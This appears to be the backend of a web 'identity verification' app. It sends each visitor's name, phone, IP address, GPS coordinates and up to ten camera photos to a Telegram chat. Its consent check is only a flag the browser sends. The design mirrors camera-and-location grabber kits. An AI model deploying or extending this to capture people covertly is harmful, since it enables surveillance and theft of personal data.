const express = require('express');
const path = require('path');

const MAX_PHOTOS = 10;
const SESSION_TTL_MS = 30 * 60 * 1000;
const MAX_PHOTO_BYTES = 2 * 1024 * 1024;

function requiredEnv(name, env = process.env) {
  const value = env[name]?.trim();
  if (!value) throw new Error(`${name} is required`);
  return value;
}

function createTelegramClient({ token, chatId, fetchImpl = global.fetch }) {
  if (typeof fetchImpl !== 'function') throw new Error('A fetch implementation is required');
  const endpoint = method => `https://api.telegram.org/bot${token}/${method}`;

  async function telegramRequest(method, options) {
    const response = await fetchImpl(endpoint(method), options);
    const body = await response.json().catch(() => ({}));
    if (!response.ok || !body.ok) {
      throw new Error(`Telegram ${method} failed (${response.status})`);
    }
    return body.result;
  }

  return {
    sendMessage(text) {
      return telegramRequest('sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    },

    sendPhoto(buffer, { filename, caption }) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('caption', caption);
      form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), filename);
      return telegramRequest('sendPhoto', { method: 'POST', body: form });
    }
  };
}

function cleanText(value, maxLength) {
  return String(value ?? '').trim().replace(/[\u0000-\u001f\u007f]/g, ' ').slice(0, maxLength);
}

function parseLocation(location) {
  if (!location || typeof location !== 'object') return null;
  const latitude = Number(location.latitude);
  const longitude = Number(location.longitude);
  const accuracy = Number(location.accuracy);
  if (!Number.isFinite(latitude) || latitude < -90 || latitude > 90) return null;
  if (!Number.isFinite(longitude) || longitude < -180 || longitude > 180) return null;
  return {
    latitude,
    longitude,
    accuracy: Number.isFinite(accuracy) && accuracy >= 0 ? accuracy : null
  };
}

function parsePhoto(dataUrl) {
  if (typeof dataUrl !== 'string') return null;
  const match = dataUrl.match(/^data:image\/jpeg;base64,([A-Za-z0-9+/=]+)$/);
  if (!match) return null;
  const buffer = Buffer.from(match[1], 'base64');
  if (!buffer.length || buffer.length > MAX_PHOTO_BYTES) return null;
  if (buffer.length < 3 || buffer[0] !== 0xff || buffer[1] !== 0xd8 || buffer[2] !== 0xff) return null;
  return buffer;
}

function createRateLimiter({ windowMs, limit }) {
  const entries = new Map();
  return (req, res, next) => {
    const now = Date.now();
    const key = req.ip;
    const entry = entries.get(key);
    if (!entry || entry.resetAt <= now) {
      entries.set(key, { count: 1, resetAt: now + windowMs });
      return next();
    }
    if (entry.count >= limit) return res.status(429).json({ error: 'Too many requests' });
    entry.count += 1;
    next();
  };
}

function createApp({ env = process.env, telegramClient } = {}) {
  const token = telegramClient ? null : requiredEnv('TELEGRAM_BOT_TOKEN', env);
  const chatId = telegramClient ? null : requiredEnv('TELEGRAM_CHAT_ID', env);
  const telegram = telegramClient || createTelegramClient({ token, chatId });
  const sessions = new Map();
  const app = express();

  app.set('trust proxy', ['loopback', 'linklocal', 'uniquelocal']);
  app.disable('x-powered-by');
  app.use((req, res, next) => {
    res.set({
      'Cache-Control': 'no-store',
      'Content-Security-Policy': "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; media-src 'self' blob:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
      'Permissions-Policy': 'camera=(self), geolocation=(self), microphone=()',
      'Referrer-Policy': 'no-referrer',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY'
    });
    next();
  });
  app.use(express.json({ limit: '4mb', strict: true }));

  app.get('/api/health', (req, res) => res.json({ ok: true, telegram: true, maxPhotos: MAX_PHOTOS }));

  app.post('/api/verify', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 10 }), async (req, res) => {
    try {
      const name = cleanText(req.body.name, 100);
      const phone = cleanText(req.body.phone, 80);
      const sessionId = cleanText(req.body.sessionId, 80);
      const location = parseLocation(req.body.location);
      const consent = req.body.consent === true;
      const photoCount = Math.min(Math.max(Number(req.body.photoCount) || 0, 0), MAX_PHOTOS);

      if (name.length < 2 || phone.length < 5) {
        return res.status(400).json({ error: 'Name and phone/ID are required' });
      }
      if (!/^[a-f0-9-]{20,80}$/i.test(sessionId)) {
        return res.status(400).json({ error: 'Invalid session' });
      }
      if (!consent) return res.status(400).json({ error: 'Explicit consent is required' });

      const now = new Date();
      const ip = cleanText(req.ip, 80);
      const locationLines = location
        ? [
            `${location.latitude}, ${location.longitude}`,
            `Accuracy: ${location.accuracy === null ? 'unknown' : `${Math.round(location.accuracy)} m`}`,
            `Map: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
          ]
        : ['Not shared / unavailable'];

      await telegram.sendMessage([
        'INTERNAL IDENTITY VERIFICATION',
        '',
        `Name: ${name}`,
        `Phone / ID: ${phone}`,
        `IP: ${ip}`,
        `Location: ${locationLines.join('\n')}`,
        `Photos queued: ${photoCount} (maximum ${MAX_PHOTOS})`,
        `Session: ${sessionId}`,
        `Time: ${now.toISOString()}`,
        '',
        'Consent: explicitly accepted in the application before camera/location access.'
      ].join('\n'));

      sessions.set(sessionId, {
        count: 0,
        createdAt: Date.now(),
        label: name
      });
      res.json({ ok: true, sessionId, maxPhotos: MAX_PHOTOS });
    } catch (error) {
      console.error('[VERIFY]', error.message);
      res.status(502).json({ error: 'Could not deliver verification data' });
    }
  });

  app.post('/api/capture', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 120 }), async (req, res) => {
    try {
      const sessionId = cleanText(req.body.sessionId, 80);
      const session = sessions.get(sessionId);
      if (!session || Date.now() - session.createdAt > SESSION_TTL_MS) {
        sessions.delete(sessionId);
        return res.status(400).json({ error: 'Verification session is missing or expired' });
      }
      if (session.count >= MAX_PHOTOS) {
        return res.status(409).json({ error: `Maximum ${MAX_PHOTOS} photos reached` });
      }

      const photo = parsePhoto(req.body.img);
      if (!photo) return res.status(400).json({ error: 'Invalid JPEG image' });

      const photoNumber = session.count + 1;
      session.count = photoNumber;
      await telegram.sendPhoto(photo, {
        filename: `${sessionId}_${photoNumber}.jpg`,
        caption: `Verification photo ${photoNumber}/${MAX_PHOTOS}\nName: ${session.label}\nSession: ${sessionId}`
      });
      res.json({ ok: true, count: session.count, maxPhotos: MAX_PHOTOS });
    } catch (error) {
      console.error('[CAPTURE]', error.message);
      res.status(502).json({ error: 'Could not deliver verification photo' });
    }
  });

  app.use(express.static(path.join(__dirname), {
    etag: true,
    index: 'index.html',
    maxAge: 0,
    dotfiles: 'deny'
  }));

  app.use((error, req, res, next) => {
    if (error?.type === 'entity.too.large') return res.status(413).json({ error: 'Request is too large' });
    if (error instanceof SyntaxError) return res.status(400).json({ error: 'Invalid JSON' });
    next(error);
  });

  return app;
}

function start() {
  const port = Number(process.env.PORT) || 3000;
  const host = process.env.HOST || '0.0.0.0';
  const app = createApp();
  return app.listen(port, host, () => {
    console.log(`Dashboard listening on http://${host}:${port}`);
  });
}

if (require.main === module) {
  try {
    start();
  } catch (error) {
    console.error(error.message);
    process.exit(1);
  }
}

module.exports = { MAX_PHOTOS, createApp, createTelegramClient, parseLocation, parsePhoto, start };
